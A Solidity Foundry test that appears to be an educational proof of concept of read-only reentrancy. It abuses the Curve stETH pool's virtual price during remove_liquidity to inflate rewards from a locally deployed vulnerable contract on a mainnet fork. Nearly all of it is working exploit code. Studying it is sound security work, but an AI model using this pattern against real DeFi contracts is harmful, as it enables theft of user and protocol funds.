// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/interface.sol";
import "../src/ReadOnlyReentrancy.sol";

// interface ICurve {
//     function get_virtual_price() external view returns (uint256);

//     function add_liquidity(uint256[2] calldata amounts, uint256 min_mint_amount) external payable returns (uint256);

//     function remove_liquidity(uint256 lp, uint256[2] calldata min_amounts) external returns (uint256[2] memory);

//     function remove_liquidity_one_coin(uint256 lp, int128 i, uint256 min_amount) external returns (uint256);
// }

// address constant STETH_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
// address constant LP_TOKEN = 0x06325440D014e39736583c165C2963BA99fAf14E;

contract ExploitContract {
    ICurve private constant pool = ICurve(STETH_POOL);
    IERC20 public constant lpToken = IERC20(LP_TOKEN);
    VulnContract private immutable target;

    constructor(address _target) {
        target = VulnContract(_target);
    }

    function stakeTokens() external payable {
        uint256[2] memory amounts = [msg.value, 0];
        uint256 lp = pool.add_liquidity{value: msg.value}(amounts, 1);
        console.log("LP token price after staking into VunContract", pool.get_virtual_price());
        lpToken.approve(address(target), lp);
        target.stake(lp);
    }

    function performReadOnlyReentrancy() external payable {
        // Add liquidity to Curve
        uint256[2] memory amounts = [msg.value, 0];
        uint256 lp = pool.add_liquidity{value: msg.value}(amounts, 1);
        console.log("LP token price before remove_liquidity()", pool.get_virtual_price());

        // Remove liquidity from Curve
        // remove_liquidity() calls the receive() call
        uint256[2] memory min_amounts = [uint256(0), uint256(0)];
        pool.remove_liquidity(lp, min_amounts);
        console.log("------------------------------------------------------");
        console.log("LP token price after remove_liquidity()", pool.get_virtual_price());

        // Attack - log reward amount
        uint256 reward = target.getReward();
        console.log("Reward if Read-Only Reeentrancy is not invoked", reward);
    }

    receive() external payable {
        console.log("------------------Reentrancy Attack-------------------");
        console.log("LP token during remove_liquidity()", pool.get_virtual_price());
        uint256 reward = target.getReward();
        console.log("Reward if Read-Only Reeentrancy is invoked", reward);
    }
}

contract Exploit is Test {
    ExploitContract public hack;
    VulnContract public target;

    function setUp() public {
        vm.createSelectFork("mainnet");
        target = new VulnContract();
        hack = new ExploitContract(address(target));
    }

    function testPwn() public {
        hack.stakeTokens{value: 10 ether}();
        hack.performReadOnlyReentrancy{value: 1_000_000 ether}();
    }
}
